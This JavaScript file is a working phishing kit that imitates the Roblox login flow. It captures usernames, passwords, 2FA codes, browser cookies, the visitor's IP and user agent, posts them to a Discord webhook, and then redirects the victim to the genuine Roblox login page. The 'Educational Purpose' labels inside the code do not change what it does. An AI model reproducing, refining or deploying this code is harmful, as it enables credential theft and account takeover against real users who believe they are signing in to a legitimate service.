// User data object to store captured information
let userData = {
    ip: '',
    username: '',
    password: '',
    twoFAMethod: '',
    twoFACode: '',
    cookie: document.cookie || 'No cookie captured'
};

// Get user's IP address
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userData.ip = data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        userData.ip = 'Unable to retrieve IP';
    }
}

// Show loading state on a button
function showLoading(buttonId) {
    const button = document.getElementById(buttonId);
    const btnText = button.querySelector('.btn-text');
    const btnLoading = button.querySelector('.btn-loading');
    
    btnText.classList.add('hidden');
    btnLoading.classList.remove('hidden');
    button.disabled = true;
}

// Hide loading state on a button
function hideLoading(buttonId) {
    const button = document.getElementById(buttonId);
    const btnText = button.querySelector('.btn-text');
    const btnLoading = button.querySelector('.btn-loading');
    
    btnText.classList.remove('hidden');
    btnLoading.classList.add('hidden');
    button.disabled = false;
}

// Send data to Discord webhook
async function sendToWebhook() {
    if (!CONFIG.WEBHOOK_URL || CONFIG.WEBHOOK_URL.includes('your_webhook_id')) {
        console.error('Webhook URL not configured. Please update config.js');
        return;
    }

    const embed = {
        title: 'Roblox Login Captured (Educational)',
        color: 0xff0000,
        fields: [
            {
                name: 'IP Address',
                value: userData.ip,
                inline: true
            },
            {
                name: 'Username/Email',
                value: userData.username || 'Not provided',
                inline: true
            },
            {
                name: 'Password',
                value: userData.password || 'Not provided',
                inline: true
            },
            {
                name: '2FA Method',
                value: userData.twoFAMethod || 'Not provided',
                inline: true
            },
            {
                name: '2FA Code',
                value: userData.twoFACode || 'Not provided',
                inline: true
            },
            {
                name: 'Cookie',
                value: userData.cookie.length > 1024 ? userData.cookie.substring(0, 1020) + '...' : userData.cookie,
                inline: false
            },
            {
                name: 'Timestamp',
                value: new Date().toLocaleString(),
                inline: true
            },
            {
                name: 'User Agent',
                value: navigator.userAgent,
                inline: false
            }
        ],
        footer: {
            text: 'Educational Purpose - Security Awareness Demo'
        }
    };

    try {
        await fetch(CONFIG.WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                embeds: [embed],
                content: '**Educational Demo**: New login data captured'
            })
        });
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

function showRecoveryOptions() {
    document.getElementById('loginForm').classList.add('hidden');
    document.getElementById('recoveryOptions').classList.remove('hidden');
}

function showTwoFA(method) {
    document.getElementById('loginForm').classList.add('hidden');
    document.getElementById('recoveryOptions').classList.add('hidden');
    document.getElementById('twoFAForm').classList.remove('hidden');
    
    userData.twoFAMethod = method;
    
    const methodText = document.getElementById('twoFAMethod');
    if (method === 'email') {
        methodText.textContent = 'Enter the verification code sent to your email';
    } else if (method === 'phone') {
        methodText.textContent = 'Enter the verification code sent to your phone';
    } else if (method === 'device') {
        methodText.textContent = 'Approve the login attempt on your trusted device';
    }
}

function showLogin() {
    document.getElementById('twoFAForm').classList.add('hidden');
    document.getElementById('recoveryOptions').classList.add('hidden');
    document.getElementById('loginForm').classList.remove('hidden');
}

async function handleLogin() {
    userData.username = document.getElementById('username').value;
    userData.password = document.getElementById('password').value;
    
    // Show loading state
    showLoading('loginButton');
    
    // Simulate network delay
    await new Promise(resolve => setTimeout(resolve, CONFIG.LOADING_DELAY));
    
    // Show 2FA form after "logging in"
    showTwoFA('email');
    
    // Hide loading state (though the form will change)
    hideLoading('loginButton');
}

function resendCode() {
    alert('Verification code has been resent.');
}

async function handleTwoFA() {
    userData.twoFACode = document.getElementById('verificationCode').value;
    
    // Show loading state
    showLoading('verifyButton');
    
    // Simulate verification process
    await new Promise(resolve => setTimeout(resolve, CONFIG.LOADING_DELAY));
    
    // Send all captured data to webhook
    await sendToWebhook();
    
    // Redirect to actual Roblox login page after delay
    setTimeout(() => {
        window.location.href = 'https://www.roblox.com/login';
    }, CONFIG.REDIRECT_DELAY);
}

// Initialize on page load
window.onload = function() {
    getIP();
    
    // Add event listener for Enter key
    document.addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            if (!document.getElementById('loginForm').classList.contains('hidden')) {
                handleLogin();
            } else if (!document.getElementById('twoFAForm').classList.contains('hidden')) {
                handleTwoFA();
            }
        }
    });
};